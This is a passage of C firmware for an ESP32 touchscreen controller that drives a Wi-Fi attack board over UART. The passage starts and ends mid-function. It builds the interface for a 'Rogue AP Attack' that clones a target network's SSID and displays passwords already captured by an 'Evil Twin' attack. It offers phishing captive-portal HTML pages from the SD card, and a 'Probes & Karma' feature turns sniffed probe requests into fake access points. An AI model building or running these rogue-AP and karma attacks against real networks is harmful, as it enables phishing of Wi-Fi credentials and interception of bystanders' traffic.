    ESP_LOGI(TAG, "[UART%d] Rogue AP: sending start_rogueap %s XXXX", uart_index_for_tab(current_tab), rogue_ap_ssid);
    uart_send_command_for_tab(ap_cmd);
    
    // Show monitoring popup
    show_rogue_ap_popup(ctx);
}

// Show Rogue AP monitoring popup
static void show_rogue_ap_popup(tab_context_t *ctx)
{
    if (!ctx) return;
    if (ctx->rogue_ap_popup_overlay != NULL) return;  // Already showing in this tab
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    // Create modal overlay
    ctx->rogue_ap_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(ctx->rogue_ap_popup_overlay);
    lv_obj_set_size(ctx->rogue_ap_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(ctx->rogue_ap_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(ctx->rogue_ap_popup_overlay, LV_OPA_50, 0);
    lv_obj_clear_flag(ctx->rogue_ap_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    lv_obj_add_flag(ctx->rogue_ap_popup_overlay, LV_OBJ_FLAG_CLICKABLE);  // Capture clicks
    
    // Create popup as child of overlay
    ctx->rogue_ap_popup = lv_obj_create(ctx->rogue_ap_popup_overlay);
    lv_obj_set_size(ctx->rogue_ap_popup, 550, 450);
    lv_obj_center(ctx->rogue_ap_popup);
    lv_obj_set_style_bg_color(ctx->rogue_ap_popup, lv_color_hex(0x1A1A2A), 0);
    lv_obj_set_style_border_color(ctx->rogue_ap_popup, COLOR_MATERIAL_CYAN, 0);
    lv_obj_set_style_border_width(ctx->rogue_ap_popup, 2, 0);
    lv_obj_set_style_radius(ctx->rogue_ap_popup, 16, 0);
    lv_obj_set_style_shadow_width(ctx->rogue_ap_popup, 30, 0);
    lv_obj_set_style_shadow_color(ctx->rogue_ap_popup, lv_color_hex(0x000000), 0);
    lv_obj_set_style_shadow_opa(ctx->rogue_ap_popup, LV_OPA_50, 0);
    lv_obj_set_style_pad_all(ctx->rogue_ap_popup, 16, 0);
    lv_obj_set_flex_flow(ctx->rogue_ap_popup, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->rogue_ap_popup, 12, 0);
    
    // Title
    lv_obj_t *title = lv_label_create(ctx->rogue_ap_popup);
    lv_label_set_text(title, "Rogue AP Running");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_CYAN, 0);
    
    // Status label (scrollable)
    ctx->rogue_ap_status_label = lv_label_create(ctx->rogue_ap_popup);
    lv_label_set_text(ctx->rogue_ap_status_label, "Starting Rogue AP...");
    lv_obj_set_style_text_font(ctx->rogue_ap_status_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ctx->rogue_ap_status_label, lv_color_hex(0xAAAAAA), 0);
    lv_obj_set_width(ctx->rogue_ap_status_label, lv_pct(100));
    lv_label_set_long_mode(ctx->rogue_ap_status_label, LV_LABEL_LONG_WRAP);
    lv_obj_set_flex_grow(ctx->rogue_ap_status_label, 1);
    
    // Close button
    lv_obj_t *close_btn = lv_btn_create(ctx->rogue_ap_popup);
    lv_obj_set_size(close_btn, lv_pct(100), 50);
    lv_obj_set_style_bg_color(close_btn, COLOR_MATERIAL_RED, 0);
    lv_obj_set_style_bg_color(close_btn, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(close_btn, 8, 0);
    lv_obj_add_event_cb(close_btn, rogue_ap_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *close_label = lv_label_create(close_btn);
    lv_label_set_text(close_label, "Stop Rogue AP");
    lv_obj_set_style_text_font(close_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(close_label, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(close_label);
    
    // Start monitoring task
    ctx->rogue_ap_monitoring = true;
    xTaskCreate(rogue_ap_monitor_task, "rogue_ap_mon", 4096, (void*)ctx, 5, &rogue_ap_monitor_task_handle);
}

// Show Rogue AP page
static void show_rogue_ap_page(void)
{
    ESP_LOGI(TAG, "Showing Rogue AP page");
    
    tab_context_t *ctx = get_current_ctx();
    lv_obj_t *container = get_current_tab_container();
    
    if (!container) {
        ESP_LOGE(TAG, "Container not initialized for tab %d", current_tab);
        return;
    }
    
    hide_all_pages(ctx);
    
    // If page already exists for this tab, just show it
    if (ctx->rogue_ap_page) {
        lv_obj_clear_flag(ctx->rogue_ap_page, LV_OBJ_FLAG_HIDDEN);
        ctx->current_visible_page = ctx->rogue_ap_page;
        rogue_ap_page = ctx->rogue_ap_page;
        ESP_LOGI(TAG, "Showing existing rogue AP page for tab %d", current_tab);
        return;
    }
    
    ESP_LOGI(TAG, "Creating new rogue AP page for tab %d", current_tab);
    
    // Create rogue AP page
    ctx->rogue_ap_page = lv_obj_create(container);
    rogue_ap_page = ctx->rogue_ap_page;
    lv_coord_t scr_height = lv_disp_get_ver_res(NULL);
    lv_obj_set_size(ctx->rogue_ap_page, lv_pct(100), scr_height - 85);
    lv_obj_align(ctx->rogue_ap_page, LV_ALIGN_TOP_MID, 0, 85);
    lv_obj_set_style_bg_color(ctx->rogue_ap_page, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(ctx->rogue_ap_page, 0, 0);
    lv_obj_set_style_pad_all(ctx->rogue_ap_page, 15, 0);
    lv_obj_set_flex_flow(ctx->rogue_ap_page, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(ctx->rogue_ap_page, 10, 0);
    
    // Header
    lv_obj_t *header = lv_obj_create(ctx->rogue_ap_page);
    lv_obj_set_size(header, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_opa(header, LV_OPA_TRANSP, 0);
    lv_obj_set_style_border_width(header, 0, 0);
    lv_obj_set_style_pad_all(header, 0, 0);
    lv_obj_set_flex_flow(header, LV_FLEX_FLOW_ROW);
    lv_obj_set_flex_align(header, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_column(header, 15, 0);
    lv_obj_clear_flag(header, LV_OBJ_FLAG_SCROLLABLE);
    
    // Back button
    lv_obj_t *back_btn = lv_btn_create(header);
    lv_obj_set_size(back_btn, 72, 60);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x333333), 0);
    lv_obj_set_style_bg_color(back_btn, lv_color_hex(0x444444), LV_STATE_PRESSED);
    lv_obj_set_style_radius(back_btn, 8, 0);
    lv_obj_add_event_cb(back_btn, rogue_ap_back_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *back_icon = lv_label_create(back_btn);
    lv_label_set_text(back_icon, LV_SYMBOL_LEFT);
    lv_obj_set_style_text_color(back_icon, lv_color_hex(0xFFFFFF), 0);
    lv_obj_center(back_icon);
    
    // Title
    lv_obj_t *title = lv_label_create(header);
    lv_label_set_text(title, "Rogue AP Attack");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_22, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_CYAN, 0);
    
    // Get selected network SSID and try to find known password
    int idx = selected_network_indices[0];
    if (idx >= 0 && idx < network_count) {
        strncpy(rogue_ap_ssid, networks[idx].ssid, sizeof(rogue_ap_ssid) - 1);
        rogue_ap_ssid[sizeof(rogue_ap_ssid) - 1] = '\0';
    }
    memset(rogue_ap_password, 0, sizeof(rogue_ap_password));
    
    // Flush and get Evil Twin passwords (load known passwords)
    evil_twin_entry_count = 0;
    uart_port_t uart_port = uart_port_for_tab(current_tab);
    uart_flush(uart_port);
    uart_send_command_for_tab("show_pass evil");
    vTaskDelay(pdMS_TO_TICKS(1000));
    
    static char rx_buffer[2048];
    int total_len = 0;
    int retries = 10;
    int empty_reads = 0;
    
    while (retries-- > 0 && empty_reads < 3) {
        int len = transport_read_bytes(uart_port, rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
        if (len > 0) {
            total_len += len;
            empty_reads = 0;
        } else {
            empty_reads++;
        }
    }
    rx_buffer[total_len] = '\0';
    
    ESP_LOGI(TAG, "Rogue AP: Evil Twin passwords response (%d bytes)", total_len);
    
    // Parse Evil Twin passwords
    memset(evil_twin_entries, 0, sizeof(evil_twin_entries));
    char *line = strtok(rx_buffer, "\n\r");
    while (line != NULL) {
        if (strlen(line) < 5 || strstr(line, "show_pass") != NULL) {
            line = strtok(NULL, "\n\r");
            continue;
        }
        
        char ssid[64] = {0};
        char password[64] = {0};
        
        // Parse "SSID", "password" format
        char *p1 = strchr(line, '"');
        if (p1) {
            p1++;
            char *p2 = strchr(p1, '"');
            if (p2) {
                size_t len = p2 - p1;
                if (len < sizeof(ssid)) {
                    strncpy(ssid, p1, len);
                    ssid[len] = '\0';
                }
                
                char *p3 = strchr(p2 + 1, '"');
                if (p3) {
                    p3++;
                    char *p4 = strchr(p3, '"');
                    if (p4) {
                        len = p4 - p3;
                        if (len < sizeof(password)) {
                            strncpy(password, p3, len);
                            password[len] = '\0';
                        }
                    }
                }
            }
        }
        
        if (strlen(ssid) > 0 && evil_twin_entry_count < EVIL_TWIN_MAX_ENTRIES) {
            snprintf(evil_twin_entries[evil_twin_entry_count].ssid, sizeof(evil_twin_entries[0].ssid), "%s", ssid);
            snprintf(evil_twin_entries[evil_twin_entry_count].password, sizeof(evil_twin_entries[0].password), "%s", password);
            evil_twin_entry_count++;
        }
        
        line = strtok(NULL, "\n\r");
    }
    
    // Target network info
    lv_obj_t *target_label = lv_label_create(ctx->rogue_ap_page);
    lv_label_set_text_fmt(target_label, "Target SSID: %s", rogue_ap_ssid);
    lv_obj_set_style_text_font(target_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(target_label, lv_color_hex(0xCCCCCC), 0);
    
    // Password section
    lv_obj_t *pass_section = lv_obj_create(ctx->rogue_ap_page);
    lv_obj_set_size(pass_section, lv_pct(100), LV_SIZE_CONTENT);
    lv_obj_set_style_bg_color(pass_section, lv_color_hex(0x252525), 0);
    lv_obj_set_style_border_width(pass_section, 0, 0);
    lv_obj_set_style_radius(pass_section, 8, 0);
    lv_obj_set_style_pad_all(pass_section, 15, 0);
    lv_obj_set_flex_flow(pass_section, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(pass_section, 10, 0);
    lv_obj_clear_flag(pass_section, LV_OBJ_FLAG_SCROLLABLE);
    
    // Check if password is known
    bool password_known = false;
    for (int i = 0; i < evil_twin_entry_count; i++) {
        if (strcmp(evil_twin_entries[i].ssid, rogue_ap_ssid) == 0) {
            strncpy(rogue_ap_password, evil_twin_entries[i].password, sizeof(rogue_ap_password) - 1);
            rogue_ap_password[sizeof(rogue_ap_password) - 1] = '\0';
            password_known = true;
            break;
        }
    }
    
    if (password_known) {
        // Show known password as label
        lv_obj_t *pass_label = lv_label_create(pass_section);
        lv_label_set_text(pass_label, "Known Password:");
        lv_obj_set_style_text_font(pass_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(pass_label, lv_color_hex(0xFFFFFF), 0);
        
        lv_obj_t *pass_value = lv_label_create(pass_section);
        lv_label_set_text_fmt(pass_value, "%s", rogue_ap_password);
        lv_obj_set_style_text_font(pass_value, &lv_font_montserrat_16, 0);
        lv_obj_set_style_text_color(pass_value, COLOR_MATERIAL_GREEN, 0);
    } else {
        // Show password input
        lv_obj_t *pass_label = lv_label_create(pass_section);
        lv_label_set_text(pass_label, "Enter WiFi Password:");
        lv_obj_set_style_text_font(pass_label, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(pass_label, lv_color_hex(0xFFFFFF), 0);
        
        ctx->rogue_ap_password_input = lv_textarea_create(pass_section);
        lv_obj_set_size(ctx->rogue_ap_password_input, lv_pct(100), 45);
        lv_textarea_set_one_line(ctx->rogue_ap_password_input, true);
        lv_textarea_set_placeholder_text(ctx->rogue_ap_password_input, "WiFi password");
        lv_obj_set_style_bg_color(ctx->rogue_ap_password_input, lv_color_hex(0x1A1A1A), 0);
        lv_obj_set_style_border_color(ctx->rogue_ap_password_input, COLOR_MATERIAL_CYAN, 0);
        lv_obj_set_style_border_width(ctx->rogue_ap_password_input, 1, 0);
        lv_obj_set_style_text_color(ctx->rogue_ap_password_input, lv_color_hex(0xFFFFFF), 0);
        
        // Keyboard (hidden, activated on click)
        ctx->rogue_ap_keyboard = lv_keyboard_create(container);
        lv_obj_set_size(ctx->rogue_ap_keyboard, lv_pct(100), 260);
        lv_obj_align(ctx->rogue_ap_keyboard, LV_ALIGN_BOTTOM_MID, 0, 0);
        lv_keyboard_set_textarea(ctx->rogue_ap_keyboard, ctx->rogue_ap_password_input);
        lv_obj_add_flag(ctx->rogue_ap_keyboard, LV_OBJ_FLAG_HIDDEN);
        
        // Add event handler to show keyboard when textarea is clicked
        lv_obj_add_event_cb(ctx->rogue_ap_password_input, rogue_ap_password_focus_cb, LV_EVENT_FOCUSED, NULL);
    }
    
    // Fetch HTML files
    evil_twin_html_count = 0;
    memset(evil_twin_html_files, 0, sizeof(evil_twin_html_files));
    
    uart_flush(uart_port);
    uart_send_command_for_tab("list_sd");
    
    total_len = 0;
    retries = 10;
    empty_reads = 0;
    bool header_found = false;
    static char line_buffer[256];
    static int line_pos = 0;
    
    while (retries-- > 0 && evil_twin_html_count < 20) {
        int len = transport_read_bytes(uart_port, rx_buffer, sizeof(rx_buffer) - 1, pdMS_TO_TICKS(100));
        
        if (len > 0) {
            rx_buffer[len] = '\0';
            
            for (int i = 0; i < len; i++) {
                char c = rx_buffer[i];
                
                if (c == '\n' || c == '\r') {
                    if (line_pos > 0) {
                        line_buffer[line_pos] = '\0';
                        
                        if (strstr(line_buffer, "HTML files found") != NULL) {
                            header_found = true;
                        } else if (header_found && line_pos > 2) {
                            int file_num;
                            char filename[64];
                            if (sscanf(line_buffer, "%d %63s", &file_num, filename) == 2) {
                                snprintf(evil_twin_html_files[evil_twin_html_count], 
                                         sizeof(evil_twin_html_files[0]), "%s", filename);
                                ESP_LOGI(TAG, "Found HTML file %d: %s", file_num, filename);
                                evil_twin_html_count++;
                            }
                        }
                        
                        line_pos = 0;
                    }
                } else if (line_pos < (int)sizeof(line_buffer) - 1) {
                    line_buffer[line_pos++] = c;
                }
            }
        }
    }
    
    ESP_LOGI(TAG, "Rogue AP: Fetched %d HTML files", evil_twin_html_count);
    
    // HTML dropdown
    lv_obj_t *html_label = lv_label_create(ctx->rogue_ap_page);
    lv_label_set_text(html_label, "Select Portal HTML:");
    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(html_label, lv_color_hex(0xFFFFFF), 0);
    
    ctx->rogue_ap_html_dropdown = lv_dropdown_create(ctx->rogue_ap_page);
    lv_obj_set_width(ctx->rogue_ap_html_dropdown, lv_pct(100));
    lv_obj_set_height(ctx->rogue_ap_html_dropdown, 45);
    lv_obj_set_style_bg_color(ctx->rogue_ap_html_dropdown, lv_color_hex(0x2D2D2D), 0);
    lv_obj_set_style_text_color(ctx->rogue_ap_html_dropdown, lv_color_hex(0xFFFFFF), 0);
    lv_obj_set_style_border_color(ctx->rogue_ap_html_dropdown, lv_color_hex(0x555555), 0);
    
    // Build HTML dropdown options
    char html_options[2048] = "";
    for (int i = 0; i < evil_twin_html_count; i++) {
        if (i > 0) strncat(html_options, "\n", sizeof(html_options) - strlen(html_options) - 1);
        strncat(html_options, evil_twin_html_files[i], sizeof(html_options) - strlen(html_options) - 1);
    }
    lv_dropdown_set_options(ctx->rogue_ap_html_dropdown, html_options);
    
    // Style dropdown list
    lv_obj_t *html_list = lv_dropdown_get_list(ctx->rogue_ap_html_dropdown);
    if (html_list) {
        lv_obj_set_style_bg_color(html_list, lv_color_hex(0x2D2D2D), 0);
        lv_obj_set_style_text_color(html_list, lv_color_hex(0xFFFFFF), 0);
        lv_obj_set_style_border_color(html_list, lv_color_hex(0x555555), 0);
    }
    
    // Start Rogue AP button
    ctx->rogue_ap_start_btn = lv_btn_create(ctx->rogue_ap_page);
    lv_obj_set_size(ctx->rogue_ap_start_btn, lv_pct(100), 50);
    lv_obj_set_style_bg_color(ctx->rogue_ap_start_btn, COLOR_MATERIAL_CYAN, 0);
    lv_obj_set_style_bg_color(ctx->rogue_ap_start_btn, lv_color_lighten(COLOR_MATERIAL_CYAN, 30), LV_STATE_PRESSED);
    lv_obj_set_style_radius(ctx->rogue_ap_start_btn, 8, 0);
    lv_obj_add_event_cb(ctx->rogue_ap_start_btn, rogue_ap_start_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *btn_label = lv_label_create(ctx->rogue_ap_start_btn);
    lv_label_set_text(btn_label, LV_SYMBOL_POWER " Start Rogue AP");
    lv_obj_set_style_text_font(btn_label, &lv_font_montserrat_16, 0);
    lv_obj_set_style_text_color(btn_label, lv_color_hex(0x000000), 0);
    lv_obj_center(btn_label);
    
    // Set current visible page
    ctx->current_visible_page = ctx->rogue_ap_page;
}

//==================================================================================
// Captive Portal for Probes & Karma (Network Observer)
//==================================================================================

// Observer Karma button callback - fetch probes and show popup
static void observer_karma_btn_cb(lv_event_t *e)
{
    (void)e;
    ESP_LOGI(TAG, "Probes & Karma button clicked");
    karma2_fetch_probes();
}

// Fetch probes from UART and show popup
static void karma2_fetch_probes(void)
{
    ESP_LOGI(TAG, "Fetching probes from UART...");
    
    // Determine which UART to use based on current tab
    uart_port_t uart_port = get_current_uart();
    
    // Flush UART buffer
    uart_flush(uart_port);
    
    // Send list_probes command to current tab's UART
    uart_send_command_for_tab("list_probes");
    
    // Wait for response
    static char rx_buffer[2048];
    int total_len = 0;
    int retries = 10;
    
    vTaskDelay(pdMS_TO_TICKS(300));
    
    while (retries-- > 0) {
        int len = transport_read_bytes(uart_port, (uint8_t*)rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
        if (len > 0) {
            total_len += len;
        }
        if (len <= 0 && total_len > 0) break;
    }
    rx_buffer[total_len] = '\0';
    
    ESP_LOGI(TAG, "list_probes response (%d bytes): %s", total_len, rx_buffer);
    
    // Parse response - format: "N SSID_Name"
    karma2_probe_count = 0;
    memset(karma2_probes, 0, sizeof(karma2_probes));
    
    char *line = strtok(rx_buffer, "\n\r");
    while (line != NULL && karma2_probe_count < KARMA2_MAX_PROBES) {
        // Skip empty lines and info messages
        if (strlen(line) < 3 || strstr(line, "No probe") != NULL || strstr(line, "list_probes") != NULL) {
            line = strtok(NULL, "\n\r");
            continue;
        }
        
        // Parse "N SSID" format
        int idx;
        char ssid[33] = {0};
        if (sscanf(line, "%d %32[^\n\r]", &idx, ssid) >= 2 && strlen(ssid) > 0) {
            // Trim whitespace
            char *start = ssid;
            while (*start == ' ') start++;
            char *end = start + strlen(start) - 1;
            while (end > start && (*end == ' ' || *end == '\n' || *end == '\r')) *end-- = '\0';
            
            if (strlen(start) > 0) {
                snprintf(karma2_probes[karma2_probe_count], sizeof(karma2_probes[0]), "%s", start);
                ESP_LOGI(TAG, "Probe %d: %s", karma2_probe_count + 1, karma2_probes[karma2_probe_count]);
                karma2_probe_count++;
            }
        }
        
        line = strtok(NULL, "\n\r");
    }
    
    ESP_LOGI(TAG, "Found %d probes", karma2_probe_count);
    
    // Show popup with probes list
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    karma2_probes_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(karma2_probes_popup_overlay);
    lv_obj_set_size(karma2_probes_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(karma2_probes_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(karma2_probes_popup_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(karma2_probes_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    
    karma2_probes_popup_obj = lv_obj_create(karma2_probes_popup_overlay);
    lv_obj_set_size(karma2_probes_popup_obj, 400, 450);
    lv_obj_center(karma2_probes_popup_obj);
    lv_obj_set_style_bg_color(karma2_probes_popup_obj, lv_color_hex(0x2A2A2A), 0);
    lv_obj_set_style_border_color(karma2_probes_popup_obj, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_border_width(karma2_probes_popup_obj, 2, 0);
    lv_obj_set_style_radius(karma2_probes_popup_obj, 12, 0);
    lv_obj_set_style_pad_all(karma2_probes_popup_obj, 15, 0);
    lv_obj_set_flex_flow(karma2_probes_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(karma2_probes_popup_obj, 10, 0);
    
    // Title
    lv_obj_t *title = lv_label_create(karma2_probes_popup_obj);
    lv_label_set_text(title, LV_SYMBOL_WIFI " Probes & Karma");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
    
    // Subtitle
    lv_obj_t *subtitle = lv_label_create(karma2_probes_popup_obj);
    lv_label_set_text_fmt(subtitle, "Found %d probe requests - tap to start portal", karma2_probe_count);
    lv_obj_set_style_text_font(subtitle, &lv_font_montserrat_12, 0);
    lv_obj_set_style_text_color(subtitle, lv_color_hex(0x888888), 0);
    
    // Scrollable list container
    lv_obj_t *list_container = lv_obj_create(karma2_probes_popup_obj);
    lv_obj_set_size(list_container, lv_pct(100), 300);
    lv_obj_set_flex_grow(list_container, 1);
    lv_obj_set_style_bg_color(list_container, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_width(list_container, 0, 0);
    lv_obj_set_style_radius(list_container, 8, 0);
    lv_obj_set_style_pad_all(list_container, 8, 0);
    lv_obj_set_flex_flow(list_container, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_style_pad_row(list_container, 6, 0);
    
    if (karma2_probe_count == 0) {
        lv_obj_t *no_probes = lv_label_create(list_container);
        lv_label_set_text(no_probes, "No probes found.\nMake sure sniffer is running.");
        lv_obj_set_style_text_font(no_probes, &lv_font_montserrat_14, 0);
        lv_obj_set_style_text_color(no_probes, lv_color_hex(0x888888), 0);
    } else {
        for (int i = 0; i < karma2_probe_count; i++) {
            lv_obj_t *row = lv_obj_create(list_container);
            lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
            lv_obj_set_style_bg_color(row, lv_color_hex(0x2D2D2D), 0);
            lv_obj_set_style_bg_color(row, lv_color_hex(0x3D3D3D), LV_STATE_PRESSED);
            lv_obj_set_style_border_width(row, 0, 0);
            lv_obj_set_style_radius(row, 6, 0);
            lv_obj_set_style_pad_all(row, 10, 0);
            lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
            lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);
            lv_obj_add_event_cb(row, karma2_probe_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)i);
            
            lv_obj_t *ssid_label = lv_label_create(row);
            lv_label_set_text_fmt(ssid_label, "%d. %s", i + 1, karma2_probes[i]);
            lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_16, 0);
            lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xFFFFFF), 0);
        }
    }
    
    // Close button
    lv_obj_t *close_btn = lv_btn_create(karma2_probes_popup_obj);
    lv_obj_set_size(close_btn, 120, 40);
    lv_obj_set_style_bg_color(close_btn, lv_color_hex(0x444444), 0);
    lv_obj_set_style_radius(close_btn, 8, 0);
    lv_obj_add_event_cb(close_btn, karma2_probes_popup_close_cb, LV_EVENT_CLICKED, NULL);
    
    lv_obj_t *close_label = lv_label_create(close_btn);
    lv_label_set_text(close_label, "Close");
    lv_obj_set_style_text_font(close_label, &lv_font_montserrat_14, 0);
    lv_obj_center(close_label);
}

// Probe click callback
static void karma2_probe_click_cb(lv_event_t *e)
{
    karma2_selected_probe_idx = (int)(intptr_t)lv_event_get_user_data(e);
    
    if (karma2_selected_probe_idx < 0 || karma2_selected_probe_idx >= karma2_probe_count) {
        ESP_LOGW(TAG, "Invalid probe index: %d", karma2_selected_probe_idx);
        return;
    }
    
    ESP_LOGI(TAG, "Selected probe: %s", karma2_probes[karma2_selected_probe_idx]);
    
    // Close probes popup
    if (karma2_probes_popup_overlay) {
        lv_obj_del(karma2_probes_popup_overlay);
        karma2_probes_popup_overlay = NULL;
        karma2_probes_popup_obj = NULL;
    }
    
    // Show HTML selection popup
    show_karma2_html_popup();
}

// Close probes popup
static void karma2_probes_popup_close_cb(lv_event_t *e)
{
    (void)e;
    if (karma2_probes_popup_overlay) {
        lv_obj_del(karma2_probes_popup_overlay);
        karma2_probes_popup_overlay = NULL;
        karma2_probes_popup_obj = NULL;
    }
}

// Fetch HTML files from SD card
static void karma2_fetch_html_files(void)
{
    karma2_html_count = 0;
    memset(karma2_html_files, 0, sizeof(karma2_html_files));
    
    const char *html_path = "/sdcard/lab/htmls";
    ESP_LOGI(TAG, "Opening HTML directory: %s", html_path);
    
    // Check if directory exists
    struct stat st;
    if (stat(html_path, &st) != 0) {
        ESP_LOGW(TAG, "Directory does not exist: %s (errno=%d)", html_path, errno);
        return;
    }
    
    if (!S_ISDIR(st.st_mode)) {
        ESP_LOGW(TAG, "Path is not a directory: %s", html_path);
        return;
    }
    
    DIR *dir = opendir(html_path);
    if (dir == NULL) {
        ESP_LOGW(TAG, "Cannot open directory: %s (errno=%d)", html_path, errno);
        return;
    }
    
    ESP_LOGI(TAG, "Directory opened successfully, listing contents:");
    
    struct dirent *entry;
    int total_entries = 0;
    while ((entry = readdir(dir)) != NULL) {
        total_entries++;
        
        // Log every entry for debugging
        const char *type_str = "UNKNOWN";
        switch (entry->d_type) {
            case DT_REG: type_str = "FILE"; break;
            case DT_DIR: type_str = "DIR"; break;
            case DT_LNK: type_str = "LINK"; break;
            case DT_UNKNOWN: type_str = "UNKNOWN"; break;
        }
        ESP_LOGI(TAG, "  [%s] %s", type_str, entry->d_name);
        
        // Check for HTML files (accept DT_REG or DT_UNKNOWN for FAT compatibility)
        if (entry->d_type == DT_REG || entry->d_type == DT_UNKNOWN) {
            const char *ext = strrchr(entry->d_name, '.');
            if (ext) {
                ESP_LOGI(TAG, "    Extension: %s", ext);
                if (strcasecmp(ext, ".html") == 0 || strcasecmp(ext, ".htm") == 0) {
                    if (karma2_html_count < KARMA2_MAX_HTML_FILES) {
                        size_t name_len = strlen(entry->d_name);
                        size_t max_len = sizeof(karma2_html_files[0]) - 1;
                        if (name_len > max_len) name_len = max_len;
                        memcpy(karma2_html_files[karma2_html_count], entry->d_name, name_len);
                        karma2_html_files[karma2_html_count][name_len] = '\0';
                        ESP_LOGI(TAG, "    -> Added as HTML file #%d: %s", karma2_html_count + 1, karma2_html_files[karma2_html_count]);
                        karma2_html_count++;
                    }
                }
            }
        }
    }
    closedir(dir);
    
    ESP_LOGI(TAG, "Directory scan complete: %d total entries, %d HTML files found", total_entries, karma2_html_count);
}

// Show HTML selection popup
static void show_karma2_html_popup(void)
{
    // Fetch HTML files first
    karma2_fetch_html_files();
    
    lv_obj_t *container = get_current_tab_container();
    if (!container) return;
    
    karma2_html_popup_overlay = lv_obj_create(container);
    lv_obj_remove_style_all(karma2_html_popup_overlay);
    lv_obj_set_size(karma2_html_popup_overlay, lv_pct(100), lv_pct(100));
    lv_obj_set_style_bg_color(karma2_html_popup_overlay, lv_color_hex(0x000000), 0);
    lv_obj_set_style_bg_opa(karma2_html_popup_overlay, LV_OPA_70, 0);
    lv_obj_clear_flag(karma2_html_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
    
    karma2_html_popup_obj = lv_obj_create(karma2_html_popup_overlay);
    lv_obj_set_size(karma2_html_popup_obj, 350, LV_SIZE_CONTENT);
    lv_obj_center(karma2_html_popup_obj);
    lv_obj_set_style_bg_color(karma2_html_popup_obj, lv_color_hex(0x2A2A2A), 0);
    lv_obj_set_style_border_color(karma2_html_popup_obj, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_border_width(karma2_html_popup_obj, 2, 0);
    lv_obj_set_style_radius(karma2_html_popup_obj, 12, 0);
    lv_obj_set_style_pad_all(karma2_html_popup_obj, 20, 0);
    lv_obj_set_flex_flow(karma2_html_popup_obj, LV_FLEX_FLOW_COLUMN);
    lv_obj_set_flex_align(karma2_html_popup_obj, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
    lv_obj_set_style_pad_row(karma2_html_popup_obj, 15, 0);
    lv_obj_clear_flag(karma2_html_popup_obj, LV_OBJ_FLAG_SCROLLABLE);
    
    // Title
    lv_obj_t *title = lv_label_create(karma2_html_popup_obj);
    lv_label_set_text(title, "Select Portal HTML");
    lv_obj_set_style_text_font(title, &lv_font_montserrat_18, 0);
    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
    
    // SSID info
    lv_obj_t *ssid_label = lv_label_create(karma2_html_popup_obj);
    lv_label_set_text_fmt(ssid_label, "SSID: %s", karma2_probes[karma2_selected_probe_idx]);
    lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_14, 0);
    lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xCCCCCC), 0);
    
    // Dropdown for HTML files
    karma2_html_dropdown = lv_dropdown_create(karma2_html_popup_obj);
    lv_obj_set_width(karma2_html_dropdown, lv_pct(100));
    lv_obj_set_style_bg_color(karma2_html_dropdown, lv_color_hex(0x1A1A1A), 0);
    lv_obj_set_style_border_color(karma2_html_dropdown, COLOR_MATERIAL_ORANGE, 0);
    lv_obj_set_style_text_color(karma2_html_dropdown, lv_color_hex(0xFFFFFF), 0);
    
    if (karma2_html_count > 0) {
        char options[2048] = {0};
        for (int i = 0; i < karma2_html_count; i++) {
